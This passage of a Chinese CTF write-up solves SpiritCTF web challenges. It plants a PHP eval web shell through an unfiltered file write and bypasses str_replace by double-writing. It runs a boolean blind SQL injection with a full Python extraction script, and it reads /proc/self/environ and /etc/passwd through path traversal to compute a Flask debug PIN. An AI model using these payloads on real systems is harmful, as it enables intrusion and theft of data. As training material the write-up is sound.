punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'请先登录'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>观察到函数 <code>file_put_contents</code> 可控，考虑使用 Web Shell</p><p>由于此处 <code>str_replace</code> 的调用没有把返回值赋回给 <code>data</code> ，所以此行代码无效</p><p>构造参数如下( 注意使用POST方法传参 )：</p><pre class="language-none"><code class="language-none">?filename&#x3D;shell.php&amp;data&#x3D;&lt;?php eval(@$_POST[&#39;shell&#39;]); ?&gt;</code></pre><h3 id="3-1-HackBar"><a href="#3-1-HackBar" class="headerlink" title="3.1 HackBar"></a>3.1 HackBar</h3><p>登录过后无需携带 <code>Cookies</code></p><p><img src="image-12.png" alt="image-12.png"></p><h3 id="3-2-curl"><a href="#3-2-curl" class="headerlink" title="3.2 curl"></a>3.2 curl</h3><p>注意携带登录过后的PHPSESSID作为Cookies</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">"filename=shell.php&amp;data=&lt;?php eval(@<span class="token variable">$_POST</span>['shell']); ?>"</span> <span class="token parameter variable">-b</span> <span class="token string">"PHPSESSID=xxxx"</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/ffffffLag.php</code></pre><p>Web Shell 生成完毕后使用 <code>中国蚁剑antSword</code> 连接靶机</p><p>注意此处连接密码为 <code>data</code> 中 <code>POST</code> 的参数名称</p><p><img src="image-13.png" alt="image-13.png"></p><p>进入根目录即可找到 <code>flag</code></p><p><img src="image-14.png" alt="image-14.png"></p><p>Flag:</p><blockquote><p>Spirit{30df4f45-adf4-478d-a90a-00e3f91877c7}</p></blockquote><h3 id="3-3-PS-str-replace-绕过方法"><a href="#3-3-PS-str-replace-绕过方法" class="headerlink" title="3.3 PS: str_replace 绕过方法"></a>3.3 PS: str_replace 绕过方法</h3><p><code>str_replace</code> 可使用双写绕过，例如：</p><pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以通过以下方式绕过</p><pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> pphphp</code></pre><p>此处 <code>str_replace</code> 函数将 <code>p&#123;php&#125;hp</code> 中花括号部分替换为空字符串，</p><p>最后仍剩余 <code>php</code> ，从而达到绕过效果</p><h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p>题目描述:</p><blockquote><p>Hint: sql盲注</p></blockquote><p>打开页面发现有一个认证登录界面</p><p><img src="image-15.png" alt="image-15.png"></p><p>根据提示sql盲注得知</p><p>我们无法通过显性方式直接获取数据，但可以通过不同输入的回显值不同来判断输入条件是否成立</p><p>因此我们尝试判断条件 <code>True</code> 和 <code>False</code> 的回显值区别</p><blockquote><p>经过初步尝试发现屏蔽了空格的输入，若包含空格则会 <code>alert Hack!</code></p><p>此处使用 <code>/**/</code> 替换空格，以绕过空格屏蔽</p></blockquote><p>由于登录界面的sql注入应为字符型注入，因此分别尝试使用以下表单进行测试</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span>#password<span class="token operator">=</span><span class="token number">123</span>alert 用户名不存在<span class="token operator">!</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>#password<span class="token operator">=</span><span class="token number">123</span>alert 密码错误<span class="token operator">!</span></code></pre><p>根据 <code>alert</code> 的内容可以判断出网页后端对登录表单的校验是用户名与密码分离的</p><p>即先进行用户名存在性校验，再进行密码正确性校验</p><p>这种设置给了我们实现 <code>sql布尔盲注</code> 的可能</p><p>只需构造 <code>username</code> 的 <code>payload</code> ，就可以根据回显值的不同判断 <code>payload</code> 中的构造条件是否成立</p><p>因此数据长度可以通过 <code>length()</code> 函数并枚举长度进行比对来判断<br>数据内容可以通过使用 <code>substr()</code> 、 <code>mid()</code> 、 <code>substring()</code> 等函数对数据中的字符逐个进行截取并与字符表比对来读取</p><p>sql数据截取函数使用说明如下：</p><blockquote><p>substr(string, start, length)：将 string 从 start 开始的位置，截取 length 个字符<br>mid(string, start, length)：将 string 从 start 开始的位置，截取 length 个字符<br>substring(string, start, length)：将 string 从 start 开始的位置，截取 length 个字符</p></blockquote><p>构造 <code>payload</code> 有效载荷 如下:</p><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length((&#123;0&#125;))=&#123;1&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token comment">#判断数据长度</span>payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#逐字符读取数据内容</span>其中 data_payload 为可输出数据内容的语句 <span class="token punctuation">(</span>select语句等<span class="token punctuation">)</span></code></pre><p>构造 <code>Python</code> 攻击代码如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests chars <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;"</span> <span class="token comment">#常用字符表</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#判断字符串长度</span><span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length((&#123;0&#125;))=&#123;1&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">&#125;</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data length is: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>  n <span class="token comment">#读取字符串内容</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>data_length<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> result    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>data_length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span>            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>                result <span class="token operator">+=</span> char                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Reading data: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>                <span class="token keyword">break</span>  url <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)/index.php"</span>data_payload <span class="token operator">=</span> <span class="token string">"xxxx"</span>value <span class="token operator">=</span> <span class="token number">3297</span> <span class="token comment">#此处应根据实际设置为payload构造条件成立时response的长度</span> length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span>get_data<span class="token punctuation">(</span>length<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data is: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span></code></pre><p>由于不知道 <code>flag</code> 内容的存放位置，应先对存放着 <code>flag</code> 内容的数据库名、数据表名、字段名进行读取，最后再读取 <code>flag</code> 内容</p><h2 id="1-读取数据库名"><a href="#1-读取数据库名" class="headerlink" title="1. 读取数据库名"></a>1. 读取数据库名</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"database()"</span></code></pre><p>输出内容如下：</p><p><img src="image-16.png" alt="image-16.png"></p><p>得到数据库名为 <code>jluCTF</code></p><h2 id="2-读取数据表名（默认第一张表）"><a href="#2-读取数据表名（默认第一张表）" class="headerlink" title="2. 读取数据表名（默认第一张表）"></a>2. 读取数据表名（默认第一张表）</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='jluCTF'/**/limit/**/0,1"</span></code></pre><p>输出内容如下：</p><p><img src="image-17.png" alt="image-17.png"></p><p>得到数据表名为 <code>flag</code></p><h2 id="3-读取字段名-默认第一个字段"><a href="#3-读取字段名-默认第一个字段" class="headerlink" title="3. 读取字段名 (默认第一个字段)"></a>3. 读取字段名 (默认第一个字段)</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='jluCTF'/**/and/**/table_name='flag'/**/limit/**/0,1"</span></code></pre><p><img src="image-18.png" alt="image-18.png"></p><p>得到字段名为 <code>flag</code></p><h2 id="4-读取-flag-内容"><a href="#4-读取-flag-内容" class="headerlink" title="4. 读取 flag 内容"></a>4. 读取 <code>flag</code> 内容</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/flag/**/from/**/flag"</span></code></pre><p>输出内容如下：</p><p><img src="image-19.png" alt="image-19.png"></p><p>得到 <code>flag</code> ：</p><pre class="language-none"><code class="language-none">Spirit&#123;64e90c7c-e9bc-4809-aa91-ade46ceffbb1&#125;</code></pre><h1 id="pin-pin-revenge"><a href="#pin-pin-revenge" class="headerlink" title="pin &amp; pin_revenge"></a>pin &amp; pin_revenge</h1><p>pin 题目描述：</p><blockquote><p>PIN~PON!</p></blockquote><p>打开页面后发现跳转到了 <code>/?location=index.html</code></p><p>页面显示 <code>qwq</code> （？）<br><img src="image-20.png" alt="image-20.png"></p><p>经过测试发现 <code>/?location=</code> 处存在任意文件读取漏洞</p><h2 id="1-非预期解-仅pin题内存在"><a href="#1-非预期解-仅pin题内存在" class="headerlink" title="1. 非预期解 (仅pin题内存在)"></a>1. 非预期解 (仅pin题内存在)</h2><p>由于该题的环境变量没有删除干净，</p><p>因此可以从当前进程的环境变量文件中读取 <code>flag</code> 内容</p><p><code>payload</code> 如下:</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ</code></pre><p>页面返回如下内容：</p><pre class="language-none"><code class="language-none">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binHOSTNAME&#x3D;20be9d370cb1FLAG&#x3D;Spirit&#123;badd44f8-94eb-4648-b5d3-cdf837431e52&#125;LANG&#x3D;C.UTF-8GPG_KEY&#x3D;A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION&#x3D;3.11.3PYTHON_PIP_VERSION&#x3D;22.3.1PYTHON_SETUPTOOLS_VERSION&#x3D;65.5.1PYTHON_GET_PIP_URL&#x3D;https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;get-pip&#x2F;raw&#x2F;0d8570dc44796f4369b652222cf176b3db6ac70e&#x2F;public&#x2F;get-pip.pyPYTHON_GET_PIP_SHA256&#x3D;96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207HOME&#x3D;&#x2F;rootWERKZEUG_SERVER_FD&#x3D;3WERKZEUG_RUN_MAIN&#x3D;true</code></pre><p>从中获得 <code>pin</code> 题的 <code>flag</code> 如下：</p><pre class="language-none"><code class="language-none">Spirit&#123;badd44f8-94eb-4648-b5d3-cdf837431e52&#125;</code></pre><h2 id="2-预期解-pin-pin-revenge通用"><a href="#2-预期解-pin-pin-revenge通用" class="headerlink" title="2. 预期解 (pin&amp;pin_revenge通用)"></a>2. 预期解 (pin&amp;pin_revenge通用)</h2><p>PIN码是Flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p><p>这两题旨在考查通过任意文件读取漏洞计算 python flask debug 模式下的 pin 码，并利用debug shell读取flag</p><p>计算逻辑位于 <code>python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name</code>，</p><p>版本不同的区别在于3.6与3.8的md5加密和sha1加密不同。</p><h3 id="2-1-PIN生成要素"><a href="#2-1-PIN生成要素" class="headerlink" title="2.1 PIN生成要素"></a>2.1 PIN生成要素</h3><h4 id="2-1-1-username"><a href="#2-1-1-username" class="headerlink" title="2.1.1 username"></a>2.1.1 username</h4><p>用户名。通过 getpass.getuser() 读取，通过文件 <code>/etc/passwd</code> 读取。</p><h4 id="2-1-2-modname"><a href="#2-1-2-modname" class="headerlink" title="2.1.2 modname"></a>2.1.2 modname</h4><p>模块名。通过 getattr(mod,”file”,None) 读取，默认值为 <code>flask.app</code> 。</p><h4 id="2-1-3-appname"><a href="#2-1-3-appname" class="headerlink" title="2.1.3 appname"></a>2.1.3 appname</h4><p>应用名。通过 getattr(app,”name”,type(app).name) 读取，默认值为 <code>Flask</code> 。</p><h4 id="2-1-4-moddir"><a href="#2-1-4-moddir" class="headerlink" title="2.1.4 moddir"></a>2.1.4 moddir</h4><p>Flask库下 app.py 的绝对路径。通过 getattr(mod,”file”,None) 读取，实际应用中通过报错读取。</p><h4 id="2-1-5-uuidnode"><a href="#2-1-5-uuidnode" class="headerlink" title="2.1.5 uuidnode"></a>2.1.5 uuidnode</h4><p>当前网络的mac地址的十进制数。通过 uuid.getnode() 读取，通过文件 <code>/sys/class/net/eth0/address</code> 得到16进制结果，转化为10进制进行计算。</p><h4 id="2-1-6-machine-id"><a href="#2-1-6-machine-id" class="headerlink" title="2.1.6 machine_id"></a>2.1.6 machine_id</h4><p>docker机器id。每一个机器都会有自已唯一的id，</p><p>linux的id一般存放在 <code>/etc/machine-id</code> 或 <code>/proc/sys/kernel/random/boot_id</code>，</p><p>docker靶机则读取 <code>/proc/self/cgroup</code> 或 <code>/proc/self/mountinfo</code>，其中第一行的 &#x2F;docker&#x2F; 字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取。</p><p>首先访问&#x2F;etc&#x2F;machine-id，有值就break，没值就访问&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，然后不管此时有没有值，再访问&#x2F;proc&#x2F;self&#x2F;cgroup其中的值拼接到前面的值后面。</p><p>Python Flask Debug Pin 的计算代码如下：</p><h3 id="2-2-Python-3-8-MD5-Pin计算代码"><a href="#2-2-Python-3-8-MD5-Pin计算代码" class="headerlink" title="2.2 Python &lt; 3.8 MD5 Pin计算代码"></a>2.2 Python &lt; 3.8 MD5 Pin计算代码</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span> <span class="token comment">#machine_id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre><h3 id="2-3-Python-3-8-sha1-Pin计算代码"><a href="#2-3-Python-3-8-sha1-Pin计算代码" class="headerlink" title="2.3 Python &gt;&#x3D; 3.8 sha1 Pin计算代码"></a>2.3 Python &gt;&#x3D; 3.8 sha1 Pin计算代码</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>    <span class="token string">'/usr/local/lib/python3.11/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485376910315'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>    <span class="token string">'3c253d1e-8856-4e45-98b5-e82146c245c5'</span> <span class="token comment">#machine_id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre><h3 id="2-4-利用任意文件读取获取信息"><a href="#2-4-利用任意文件读取获取信息" class="headerlink" title="2.4 利用任意文件读取获取信息"></a>2.4 利用任意文件读取获取信息</h3><h4 id="2-4-1-读取-username"><a href="#2-4-1-读取-username" class="headerlink" title="2.4.1 读取 username"></a>2.4.1 读取 username</h4><p><code>payload</code> 如下：</p><pre class="language-none"><code class="language-none">&#x2F;?location&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>返回如下信息</p><pre class="language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin 